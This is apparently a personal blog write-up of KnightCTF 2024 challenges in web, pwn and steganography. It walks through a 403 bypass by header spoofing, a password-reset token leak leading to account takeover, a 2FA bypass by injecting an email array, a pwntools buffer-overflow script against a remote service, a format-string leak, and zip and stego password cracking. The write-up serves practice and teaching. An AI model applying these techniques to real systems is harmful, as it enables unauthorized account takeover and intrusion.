---
layout: post
title: KnightCTF 2024 Writeup
categories: [CTF, Writeup]
tags: [web, pwn, stegano]
date: 2024-01-26 01:58 +0700
img_path: 'https:////raw.githubusercontent.com/T3l3sc0p3/ctf-writeups/master/KnightCTF-2024/'
image:
  path: banner.jpg
---

KnightCTF 2024 is a jeopardy CTF competition for Cyber ​​Security professionals and students or those who are interested in security. There will be challenges in various categories like PWN, Reversing, Web, Cryptography etc.

This is some of my writeup in web, pwn, and steganography challenges, hope you like it!

# Web

## Levi Ackerman (50 pts)

![Levi Ackerman](Web/img/levi-ackerman.png)

Yea, as you can see in the task description, we should go to `http://66.228.53.87:5000/robots.txt` to check if Levi is a robot =))

When you access the **/robots.txt**, you will see this line:

```txt
Disallow : /l3v1_4ck3rm4n.html
```

Now, you just need to visit `http://66.228.53.87:5000/l3v1_4ck3rm4n.html` to get the flag

`Flag: KCTF{1m_d01n6_17_b3c4u53_1_h4v3_70}`

## Kitty (50 pts)

![Kitty](Web/img/kitty.png)

First, check the source code and I see the credentials in the **script.js** file. It's `Username:Password` as you can see in the image below

![cred](Web/img/kitty-cred.png)

Once logged in, you will see a dashboard page with an input form for creating posts

Now, look at the source code again, I found an intersting line:

![cat flag.txt](Web/img/kitty-flag.png)

This means that all you need to do is enter `cat flag.txt` in the input form to retrieve the flag

`Flag: KCTF{Fram3S_n3vE9_L1e_4_toGEtH3R}`

## README (305 pts)

![readme pls](Web/img/readme.png)

In this challenge, we need to read the **flag.txt** file to get flag. And as I see here, I can only read **text.txt** file, **flag.txt** will return 403 status code

To bypass 403, I used `Forwarded-For: 127.0.0.1` header from [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/403-and-401-bypasses), and that's it!

![hmm](Web/img/readme-flag.png)

`Flag: KCTF{kud05w3lld0n3!}`

There are a few other headers that you can try out!

## Gain Access 1 (100 pts)

![Gain Access 1](Web/img/gain-access-1.png)

This is a login page and our mission is to find a way to bypass that to access the admin panel (= flag)

First, I analyzed the source code and found an email `root@knightctf.com` that might be useful later. The next focus was on the `Forgot Password?` function. I tried entering a different email like `27fbec16-85a8-497b-86ff-5bf0580abdd0@email.webhook.site`, but it returned `Invalid Email.`

![forgot.php](Web/img/gain-access-1-forgot-password.png)

So, I intercepted the request using Burp Suite to test it more

![token](Web/img/gain-access-1-token.png)

Here, did you see any wrong in the request response? Yes, the web returns the token! This means I can use this token to bypass authentication!

After checking **robots.txt**, I found the `/r3s3t_pa5s.php` page. I saw the `/r3s3t_pa5s.php` page required a token to work. Assuming the parameter to be `token`, I sent the above token to retrieve the reset link like this:

```
http://45.33.123.243:13556/r3s3t_pa5s.php?token=fciJdLm6x1eGQgRAohqWC
```

![reset password successfully](Web/img/gain-access-1-reset-passwd.png)

I successfully reset the password for `root@knightctf.com` to **123**. I then used these credentials to log in and access the admin panel, and voila! I found the flag

`Flag: KCTF{ACc0uNT_tAk3Over}`

## Gain Access 2 (440 pts)

![Gain Access 2](Web/img/gain-access-2.png)

As usual, I checked the source code and found the **notesssssss.txt** file. Which contains an email and a hash (maybe?)

```txt
I've something for you. Think.....
root@knightctf.com:d05fcd90ca236d294384abd00ca98a2d
```

After searching the hash, I found [md5hashing.net](https://md5hashing.net/hash/md5/d05fcd90ca236d294384abd00ca98a2d) can unhash it

![hash](Web/img/gain-access-2-hash.png)

Now, I got the password is `letmein_kctf2024`. But after login in, I faced with **Two-Factor Authentication** aka 2FA

Look at the `Resend Code` function, looks like it only accepts `root@knightctf.com` as you can see in the image below

![resend code](Web/img/gain-access-2-resend-code.png)

What if I add another email besides `root@knightctf.com`?

![hmmm](https://i.imgur.com/iPxv78U.jpg)

And I added `27fbec16-85a8-497b-86ff-5bf0580abdd0@email.webhook.site` to the request by using `[]`, which makes it become a list. You can see more about how it works [here](https://www.w3schools.com/js/js_json_arrays.asp)

```json
{ "email":["root@knightctf.com","27fbec16-85a8-497b-86ff-5bf0580abdd0@email.webhook.site"] }
```

I tried it and it worked. The website sent the code to my email as well

![code](Web/img/gain-access-2-code.png)

![Noice](https://i.imgur.com/jwYlN9G.gif)

Lastly, I entered the code and got the flag for `Gain Access 2`!

![flag](Web/img/gain-access-2-flag.png)

`Flag: KCTF{AuTh_MIsC0nFigUraTi0N}`

# Pwn

## Get The Sword (100 pts)

![get the sword](Pwn/img/get-the-sword.png)

Download link: [https://drive.google.com/file/d/1HsQMxiZlP5978DzqnoZs6g6QOnCzVm_G/view](https://drive.google.com/file/d/1HsQMxiZlP5978DzqnoZs6g6QOnCzVm_G/view)

First, I run `file` and `checksec` commands to check the file type as well as some information about the file. And I noticed that this is a 32-bit program

![32bit](Pwn/img/get-the-sword-32bit.png)

Next, I run this file to know the flow of the program. This is a simple program that lets us type anything to "get the sword" (= flag)

![test](Pwn/img/get-the-sword-test.png)

After that, I used **[Ghidra](https://github.com/NationalSecurityAgency/ghidra)** to generate pseudo code and analyze it

As you can see in the image below, there are 4 functions that we may focus on, especially `main` and `getSword`:

![function](Pwn/img/get-the-sword-functions.png)

Let's take a look at the `main` function:

```c
//main

undefined4 main(void)

{
  printSword();
  intro();
  return 0;
}
```

We see that it calls the `printSword` function, which will print an ASCII sword to the terminal as I tested above. It also calls `intro` function:

```c
//intro

void intro(void)

{
  undefined local_20 [24];
  
  printf("What do you want ? ?: ");
  fflush(_stdout);
  __isoc99_scanf(&DAT_0804a08c,local_20);
  printf("You want, %s\n",local_20);
  return;
}
```

The `intro` function allows input of up to 24 characters and prints it to the terminal. But, it uses `scanf`, which means we can input more than 24 characters to execute Stack Overflow vulnerability

The last function is `getSword()`:

```c
//getSword

void getSword(void)

{
  system("cat flag.txt");
  fflush(_stdout);
  return;
}
```

The `getSword()` function makes the challenge easier because our mission now is just to find a way to call it and we will get the flag

![It's Hacking Time](https://i.imgur.com/kuFQ3u9.jpg)

First, we need to overflow the buffer by filling it with 24 characters

```sh
python -c "print('A'*24)" | ./get_sword
```

But I don't see the `Segmentation Fault` here, so I'll continue to test some values until I reach it (it's **28** characters)

![28 chars](Pwn/img/get-the-sword-28.png)

Because this is 32-bit program, we can then add 4 more bytes to overflow the EBP register. If it's 64-bit program, the bytes will be 8 to overflow the RBP register

```sh
python -c "print('A'*32)" | ./get_sword
```

Finally, by adding the address of the `getSword()` function, we can call it and retrieve the flag

You can use **[gdb](https://github.com/hugsy/gef)** to get the address of the `getSword()` function or use **pwntools** to find it faster

This is the exploit script:

```py
#!/usr/bin/python3

from pwn import *

elf = ELF("./get_sword")
io = remote("173.255.201.51", 31337)
io.sendline(b'\x90'*32 + p64(elf.sym['getSword']))
io.interactive()
io.close()
```

![flag](Pwn/img/get-the-sword-flag.png)

`Flag: KCTF{so_you_g0t_the_sw0rd}`

**Notes:** `\x90` is called NOPs. To read more about NOPs, click [here](https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/nops.md)

## The Dragon's Secret Scroll (145 pts)

![the dragon's secret scroll](Pwn/img/the-dragon-secret-scroll.png)

```sh
 nc 173.255.201.51 51337
```

At first, I attempted to overflow the server with numerous 'A' characters, but it was unsuccessful. Therefore, I suspected that there might be some other vulnerabilities~~

![Format String](Pwn/img/the-dragon-secret-scroll-fs.png)

This time, I tested with `%x`, `%p` and I realized it has [Format String vulnerability](https://owasp.org/www-community/attacks/Format_string_attack)

```sh
python -c "print('%p '*50)" | nc 173.255.201.51 51337
```

![](Pwn/img/the-dragon-secret-scroll-vuln.png)

Now, focus on the highlighted line and use [CyberChef](https://gchq.github.io/CyberChef) to decode it. Apply the `Swap endianness` and `Hex` to see the flag. Just look carefully!

![flag](Pwn/img/the-dragon-secret-scroll-flag.png)

`Flag: KCTF{DRAGONsCrOll}`

# Steganography

## Flag Hunt! (100 pts)

![flag hunt](Steganography/img/flag-hunt.png)

Download link: [https://drive.google.com/file/d/17nINR5uv5fwiBXAE9FGVw4UpoJQDK1UH/view](https://drive.google.com/file/d/17nINR5uv5fwiBXAE9FGVw4UpoJQDK1UH/view)

This zip file needs a password to extract but I couldn't find it, so I decided to crack it using `fcrackzip`

```sh
fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u chall.zip

PASSWORD FOUND!!!!: pw == zippo123
```

Unzip the file with the password `zippo123`, and you will see a bunch of rickroll images, 2 txt files and a wav file

**n0t3.txt**:

```txt
The flag is here somewhere. Keep Searching..

Tip: Use lowercase only
```

**nooope_not_here_gotta_try_harder.txt**:

```txt
KCTF{f4k3_fl46}
```

About the `key.wav` file, I realize this is morse code and we can decode it using [this website](https://morsecode.world/international/decoder/audio-decoder-adaptive.html):

```txt
MORSECODETOTHERESCUE!!
```

After that, I literally in vain, but luckily, when tried uploading one of the rickroll images to [aperisolve.fr](https://aperisolve.fr/), I saw something suspect

![sus](Steganography/img/flag-hunt-size.png)

**img725.jpg** have a different size than other images

This immediately let me think about [stegseek](https://github.com/RickdeJager/stegseek), a tool used to crack and find hidden content in an image

```sh
stegseek --extract img725.jpg flag.txt
```

When it required the passphrase, I tried the decoded morse code in uppercase but it was not successful. However, I recalled a helpful tip from **n0t3.txt** and changed it to lowercase to get the flag

`Flag: KCTF{3mb3d_53cr37_4nd_z1pp17_4ll_up_ba6df32ce}`

**Thanks for reading guys :3**
